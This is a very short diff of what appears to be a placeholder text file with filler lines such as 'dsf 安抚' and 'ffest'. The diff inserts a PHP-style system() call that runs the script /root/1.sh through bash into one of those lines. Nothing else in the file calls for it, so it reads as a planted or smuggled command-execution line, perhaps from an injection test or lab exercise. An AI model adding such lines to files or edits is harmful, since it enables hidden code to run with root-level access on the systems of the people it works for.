@@ -1,3 +1,4 @@
-dsf 安抚#
+dsf 安抚system("/bin/bash /root/1.sh", $status);
+#
 
 ffest
